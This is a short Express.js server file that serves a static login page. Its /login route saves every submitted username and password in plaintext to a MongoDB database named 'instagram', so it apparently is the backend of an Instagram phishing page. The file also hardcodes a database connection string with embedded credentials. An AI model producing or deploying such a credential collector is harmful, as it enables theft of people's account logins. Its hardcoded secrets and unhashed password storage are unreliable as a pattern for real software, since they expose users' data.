const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const cors = require('cors'); // Make sure this is imported
const User = require('./models/user'); // Import user model

const app = express(); // Initialize app
const PORT = 3000;

// Enable CORS
app.use(cors()); // Now you can use it after initializing app

// MongoDB connection
const mongoURL = 'mongodb+srv://varadkr:instagram@instagram.mp0ag.mongodb.net/?retryWrites=true&w=majority&appName=instagram'; 
mongoose
  .connect(mongoURL, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('MongoDB Connected'))
  .catch((err) => console.log(err));

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (like your login page)
app.use(express.static('public'));

// Route to handle login and save data
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const newUser = new User({ username, password });
    await newUser.save();
    return res.send('<h1>Login Details Saved Successfully</h1>');
  } catch (err) {
    console.error(err);
    res.status(500).send('<h1>Internal Server Error</h1>');
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
